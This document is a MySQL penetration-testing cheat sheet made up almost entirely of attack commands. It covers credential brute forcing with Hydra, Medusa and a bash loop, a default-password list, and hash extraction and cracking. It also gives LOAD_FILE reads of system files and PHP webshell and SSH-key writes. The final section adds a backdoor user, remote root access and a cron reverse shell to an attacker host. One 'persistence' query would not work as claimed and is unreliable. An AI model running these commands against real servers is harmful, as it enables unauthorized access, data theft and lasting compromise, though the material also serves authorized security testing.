# MySQL Enumeration Cheat Sheet

## Table of Contents
1. [Overview](#overview)
2. [Ports & Protocols](#ports--protocols)
3. [Quick Discovery](#quick-discovery)
4. [Essential Enumeration Workflow](#essential-enumeration-workflow)
   - [Service Detection](#1-service-detection)
   - [Authentication Testing](#2-authentication-testing)
   - [Database Enumeration](#3-database-enumeration)
   - [Data Extraction](#4-data-extraction)
5. [Manual Interaction](#manual-interaction)
   - [Basic MySQL Commands](#basic-mysql-commands)
   - [Database Exploration](#database-exploration)
   - [Information Schema Queries](#information-schema-queries)
6. [Credential Attacks](#credential-attacks)
7. [Advanced Techniques](#advanced-techniques)
8. [Configuration Analysis](#configuration-analysis)
9. [Common Vulnerabilities](#common-vulnerabilities)
10. [Quick Reference Commands](#quick-reference-commands)
11. [Testing Checklist](#testing-checklist)
12. [Critical Security Issues](#critical-security-issues)

---

## Overview

**MySQL** is an open-source relational database management system (RDBMS) developed by Oracle. It's widely used in web applications, particularly in LAMP (Linux, Apache, MySQL, PHP) and LEMP (Linux, Nginx, MySQL, PHP) stacks, making it a common target during penetration testing.

### Key Functions
- **Data Storage**: Structured data storage in tables with rows and columns
- **User Management**: Authentication and authorization systems
- **Query Processing**: SQL command execution and data retrieval
- **Network Access**: Client-server architecture with network connectivity
- **Transaction Management**: ACID compliance and data integrity

### Why MySQL Matters in Pentesting
- **Credential Exposure**: Weak or default passwords are common
- **Information Disclosure**: Database contents reveal sensitive information
- **Privilege Escalation**: Database access can lead to system compromise
- **Configuration Issues**: Misconfigurations expose databases externally
- **Web Application Integration**: Often contains user credentials and application data

### Common Attack Vectors
- **Weak Authentication**: Default or weak passwords
- **Network Exposure**: Database accessible from external networks
- **Privilege Abuse**: Overprivileged database users
- **Information Disclosure**: Sensitive data in databases
- **Configuration Exploitation**: Insecure MySQL settings

---

## Ports & Protocols

```
3306/tcp - MySQL Database (default)
33060/tcp - MySQL X Protocol (MySQL 8.0+)
```

### MySQL Versions
| Version | Key Features | Security Notes |
|---------|-------------|----------------|
| **MySQL 5.x** | Traditional MySQL | Legacy authentication |
| **MySQL 8.0+** | Enhanced security, X Protocol | Modern authentication plugins |
| **MariaDB** | MySQL fork | Enhanced security features |

---

## Quick Discovery

```bash
# Port scan for MySQL
nmap -p 3306,33060 --open -sV target

# MySQL-specific scripts
nmap -p 3306 --script=mysql-* target

# Service version detection
nmap -p 3306 -sV --script=mysql-info target
```

---

## Essential Enumeration Workflow

### 1. Service Detection

#### Basic MySQL Detection
```bash
# Port and version detection
nmap -p 3306 -sV target

# MySQL banner grabbing
nmap -p 3306 --script=mysql-info target

# Check for MySQL X Protocol
nmap -p 33060 -sV target
```

#### Service Information Gathering
```bash
# Comprehensive MySQL scan
nmap -p 3306 --script=mysql-info,mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-users,mysql-variables target

# SSL/TLS detection
nmap -p 3306 --script=ssl-cert,ssl-enum-ciphers target
```

### 2. Authentication Testing

#### Default Credentials Testing
```bash
# Common default credentials
mysql -u root -h target                    # No password
mysql -u root -p -h target                 # Prompt for password
mysql -u admin -padmin -h target           # admin:admin
mysql -u mysql -pmysql -h target           # mysql:mysql
mysql -u test -ptest -h target             # test:test

# Database-specific defaults
mysql -u wordpress -pwordpress -h target   # WordPress defaults
mysql -u joomla -pjoomla -h target         # Joomla defaults
```

#### Empty Password Testing
```bash
# Test for empty passwords
nmap -p 3306 --script=mysql-empty-password target

# Manual empty password testing
mysql -u root -h target
mysql -u admin -h target
mysql -u mysql -h target
mysql -u user -h target
```

### 3. Database Enumeration

#### Database Discovery
```bash
# Once authenticated, list databases
mysql -u root -ppassword -h target -e "SHOW DATABASES;"

# Alternative method
mysql -u root -ppassword -h target
> SHOW DATABASES;
```

#### Table Enumeration
```bash
# List tables in specific database
mysql -u root -ppassword -h target -e "USE database_name; SHOW TABLES;"

# Get table structure
mysql -u root -ppassword -h target -e "USE database_name; DESCRIBE table_name;"
```

### 4. Data Extraction

#### Sensitive Data Discovery
```bash
# Extract user data
mysql -u root -ppassword -h target -e "SELECT * FROM mysql.user;"

# Search for specific data
mysql -u root -ppassword -h target -e "SELECT * FROM database.users WHERE username LIKE '%admin%';"

# Extract password hashes
mysql -u root -ppassword -h target -e "SELECT User, authentication_string FROM mysql.user;"
```

---

## Manual Interaction

### Basic MySQL Commands

#### Connection and Authentication
```bash
# Connect with credentials
mysql -u username -ppassword -h target_ip

# Connect to specific database
mysql -u username -ppassword -h target_ip database_name

# Connect with port specification
mysql -u username -ppassword -h target_ip -P 3306
```

#### Basic Information Gathering
```sql
-- Show MySQL version
SELECT version();

-- Show current user
SELECT user();

-- Show current database
SELECT database();

-- Show system variables
SHOW VARIABLES;

-- Show process list
SHOW PROCESSLIST;

-- Show user privileges
SHOW GRANTS;
```

### Database Exploration

#### Database and Table Operations
```sql
-- List all databases
SHOW DATABASES;

-- Select database
USE database_name;

-- List tables in current database
SHOW TABLES;

-- Show table structure
DESCRIBE table_name;
SHOW COLUMNS FROM table_name;

-- Show table creation statement
SHOW CREATE TABLE table_name;
```

#### Data Retrieval
```sql
-- Select all data from table
SELECT * FROM table_name;

-- Limit results
SELECT * FROM table_name LIMIT 10;

-- Search for specific data
SELECT * FROM users WHERE username = 'admin';

-- Search for patterns
SELECT * FROM users WHERE username LIKE '%admin%';
SELECT * FROM users WHERE email LIKE '%@admin.%';
```

### Information Schema Queries

#### System Information
```sql
-- Database information
SELECT SCHEMA_NAME FROM information_schema.SCHEMATA;

-- Table information
SELECT TABLE_SCHEMA, TABLE_NAME FROM information_schema.TABLES;

-- Column information
SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME, DATA_TYPE 
FROM information_schema.COLUMNS 
WHERE TABLE_SCHEMA = 'database_name';

-- User information
SELECT User, Host FROM mysql.user;
```

#### Privilege Information
```sql
-- Show user privileges
SELECT * FROM mysql.user;

-- Show database privileges
SELECT * FROM mysql.db;

-- Show table privileges
SELECT * FROM mysql.tables_priv;

-- Show column privileges
SELECT * FROM mysql.columns_priv;
```

---

## Credential Attacks

### Brute Force Attacks

#### Hydra
```bash
# MySQL brute force
hydra -L users.txt -P passwords.txt mysql://target

# Single user, multiple passwords
hydra -l root -P passwords.txt mysql://target

# Multiple users, single password
hydra -L users.txt -p password mysql://target

# Custom port
hydra -L users.txt -P passwords.txt mysql://target:3306
```

#### Medusa
```bash
# MySQL brute force with Medusa
medusa -h target -U users.txt -P passwords.txt -M mysql

# Single user attack
medusa -h target -u root -P passwords.txt -M mysql

# Verbose output
medusa -h target -U users.txt -P passwords.txt -M mysql -v 4
```

#### Custom Script Attack
```bash
# MySQL brute force script
#!/bin/bash
users=("root" "admin" "mysql" "user" "test")
passwords=("" "root" "admin" "mysql" "password" "123456")

for user in "${users[@]}"; do
    for pass in "${passwords[@]}"; do
        echo "Testing $user:$pass"
        mysql -u $user -p$pass -h target -e "SELECT 1;" 2>/dev/null && echo "[+] Success: $user:$pass"
    done
done
```

### Nmap Authentication Scripts
```bash
# MySQL brute force with Nmap
nmap -p 3306 --script=mysql-brute --script-args userdb=users.txt,passdb=passwords.txt target

# MySQL empty password check
nmap -p 3306 --script=mysql-empty-password target

# MySQL user enumeration
nmap -p 3306 --script=mysql-enum target
```

---

## Advanced Techniques

### File System Access

#### Reading Files (if FILE privilege exists)
```sql
-- Read local files
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/etc/hosts');
SELECT LOAD_FILE('/var/log/mysql/error.log');

-- Read configuration files
SELECT LOAD_FILE('/etc/mysql/mysql.conf.d/mysqld.cnf');
SELECT LOAD_FILE('/etc/my.cnf');
```

#### Writing Files (if FILE privilege exists)
```sql
-- Write to files
SELECT 'PHP webshell content' INTO OUTFILE '/var/www/html/shell.php';

-- Create webshell
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/cmd.php';

-- Write SSH keys
SELECT 'ssh-rsa AAAAB3...' INTO OUTFILE '/home/user/.ssh/authorized_keys';
```

### User Defined Functions (UDF)

#### System Command Execution
```sql
-- Check for UDF functions
SELECT * FROM mysql.func;

-- Create UDF for command execution (if privileges allow)
CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so';

-- Execute system commands
SELECT sys_exec('whoami');
SELECT sys_exec('id');
```

### Information Disclosure

#### Hash Extraction
```sql
-- Extract password hashes
SELECT User, authentication_string FROM mysql.user;

-- MySQL 5.x hash format
SELECT User, Password FROM mysql.user;

-- Extract to file
SELECT User, authentication_string FROM mysql.user INTO OUTFILE '/tmp/hashes.txt';
```

#### Sensitive Data Discovery
```sql
-- Search for common sensitive tables
SELECT TABLE_SCHEMA, TABLE_NAME FROM information_schema.TABLES 
WHERE TABLE_NAME LIKE '%user%' OR TABLE_NAME LIKE '%admin%' 
OR TABLE_NAME LIKE '%password%' OR TABLE_NAME LIKE '%login%';

-- Search for email addresses
SELECT * FROM information_schema.COLUMNS 
WHERE COLUMN_NAME LIKE '%email%' OR COLUMN_NAME LIKE '%mail%';

-- Search for password fields
SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME FROM information_schema.COLUMNS 
WHERE COLUMN_NAME LIKE '%pass%' OR COLUMN_NAME LIKE '%pwd%';
```

---

## Configuration Analysis

### Dangerous MySQL Settings

#### Security-Relevant Configuration
```sql
-- Check dangerous settings
SHOW VARIABLES LIKE 'secure_file_priv';    -- File access restrictions
SHOW VARIABLES LIKE 'local_infile';        -- LOCAL INFILE enabled
SHOW VARIABLES LIKE 'general_log%';        -- Query logging
SHOW VARIABLES LIKE 'log_bin%';            -- Binary logging

-- Check SSL configuration
SHOW VARIABLES LIKE '%ssl%';

-- Check authentication methods
SHOW VARIABLES LIKE 'default_authentication_plugin';
```

#### Network Configuration
```sql
-- Check bind address
SHOW VARIABLES LIKE 'bind_address';

-- Check port configuration
SHOW VARIABLES LIKE 'port';

-- Check max connections
SHOW VARIABLES LIKE 'max_connections';
```

### Log Analysis
```sql
-- Enable general log (if privileges allow)
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = '/var/log/mysql/general.log';

-- Check log settings
SHOW VARIABLES LIKE '%log%';

-- View error log location
SHOW VARIABLES LIKE 'log_error';
```

---

## Common Vulnerabilities

### Weak Authentication
```bash
# VULNERABILITY: Empty root password
mysql -u root -h target
# Successful connection without password

# VULNERABILITY: Default credentials
mysql -u root -proot -h target
mysql -u admin -padmin -h target
```

### Network Exposure
```bash
# VULNERABILITY: MySQL accessible from external networks
nmap -p 3306 --open target_range

# Check bind address configuration
mysql -u user -ppass -h target -e "SHOW VARIABLES LIKE 'bind_address';"
# Result: bind_address = 0.0.0.0 (VULNERABLE)
```

### Privilege Escalation
```sql
-- VULNERABILITY: Excessive user privileges
SHOW GRANTS FOR 'user'@'%';
-- Result: GRANT ALL PRIVILEGES ON *.* TO 'user'@'%'

-- VULNERABILITY: FILE privilege
SELECT User, File_priv FROM mysql.user WHERE File_priv = 'Y';
```

### Information Disclosure
```sql
-- VULNERABILITY: Sensitive data in plain text
SELECT * FROM users WHERE password IS NOT NULL;

-- VULNERABILITY: Detailed error messages
-- Enable sql_warnings for verbose output
SET sql_warnings = 1;
```

---

## Quick Reference Commands

### Discovery
```bash
nmap -p 3306 --script=mysql-info target
nmap -p 3306 --script=mysql-empty-password target
hydra -L users.txt -P passwords.txt mysql://target
```

### Connection
```bash
mysql -u root -ppassword -h target
mysql -u user -h target -e "SHOW DATABASES;"
```

### Enumeration
```sql
SHOW DATABASES;
USE database_name;
SHOW TABLES;
SELECT * FROM mysql.user;
```

### Data Extraction
```sql
SELECT User, authentication_string FROM mysql.user;
SELECT * FROM information_schema.TABLES;
SELECT LOAD_FILE('/etc/passwd');
```

---

## Testing Checklist

#### Discovery & Detection
- [ ] Port 3306/33060 open and accessible
- [ ] MySQL version identification
- [ ] SSL/TLS configuration assessment
- [ ] Network accessibility verification

#### Authentication Testing
- [ ] Default credential testing
- [ ] Empty password verification
- [ ] Brute force attacks (rate-limited)
- [ ] Authentication method analysis

#### Database Enumeration
- [ ] Database listing and access
- [ ] Table structure discovery
- [ ] User and privilege enumeration
- [ ] Sensitive data identification

#### Configuration Assessment
- [ ] Dangerous setting identification
- [ ] File privilege verification
- [ ] Network binding analysis
- [ ] Logging configuration review

#### Data Extraction
- [ ] Password hash extraction
- [ ] Sensitive table discovery
- [ ] File system access testing
- [ ] UDF capability assessment

---

## Critical Security Issues

### Empty/Default Passwords
- **Impact**: Unauthorized database access, data theft
- **Detection**: Successful login without/with default credentials
- **Exploitation**: `mysql -u root -h target`

### Network Exposure
- **Impact**: External database access, increased attack surface
- **Detection**: Port 3306 accessible from external networks
- **Exploitation**: Remote connection and enumeration

### Excessive Privileges
- **Impact**: Privilege escalation, system compromise
- **Detection**: Users with FILE or excessive privileges
- **Exploitation**: File system access, UDF exploitation

### Information Disclosure
- **Impact**: Sensitive data exposure, credential harvesting
- **Detection**: Accessible sensitive databases/tables
- **Exploitation**: Customer data, user credentials extraction

### File System Access
- **Impact**: Local file read/write, web shell deployment
- **Detection**: FILE privilege on user accounts
- **Exploitation**: `SELECT LOAD_FILE('/etc/passwd')`

---

## Common MySQL Databases

### System Databases
```
information_schema - Metadata about databases and tables
mysql             - User accounts and privileges
performance_schema - Performance monitoring data
sys               - Performance schema views and procedures
```

### Application Databases
```
wordpress         - WordPress CMS database
joomla           - Joomla CMS database
drupal           - Drupal CMS database
phpmyadmin       - phpMyAdmin configuration
roundcube        - Roundcube webmail database
```

---

## Default Credentials List

### Common MySQL Defaults
```
root:(empty)
root:root
root:admin
root:password
admin:admin
mysql:mysql
test:test
user:user
guest:(empty)
```

### Application-Specific
```
wordpress:wordpress
joomla:joomla
drupal:drupal
phpmyadmin:phpmyadmin
xampp:xampp
wamp:wamp
```

---

## Advanced Exploitation

### Hash Cracking
```bash
# Extract MySQL hashes
mysql -u root -ppass -h target -e "SELECT User, authentication_string FROM mysql.user;" > hashes.txt

# Crack with hashcat
hashcat -m 300 hashes.txt wordlist.txt    # MySQL 5.x
hashcat -m 7401 hashes.txt wordlist.txt   # MySQL 8.x
```

### Post-Exploitation
```sql
-- Create backdoor user
CREATE USER 'backdoor'@'%' IDENTIFIED BY 'password';
GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%';
FLUSH PRIVILEGES;

-- Enable remote access
UPDATE mysql.user SET Host='%' WHERE User='root';
FLUSH PRIVILEGES;

-- Persistence via startup
INSERT INTO mysql.general_log VALUES (NOW(), 'backdoor', 'localhost', 1, 'Connect', 'root', 0, '');
```

### File System Exploitation
```sql
-- Web shell deployment
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

-- SSH key injection
SELECT 'ssh-rsa AAAAB3NzaC1yc2EAAAA...' INTO OUTFILE '/home/user/.ssh/authorized_keys';

-- Cron job persistence
SELECT '* * * * * /bin/bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"' INTO OUTFILE '/etc/cron.d/backdoor';
```
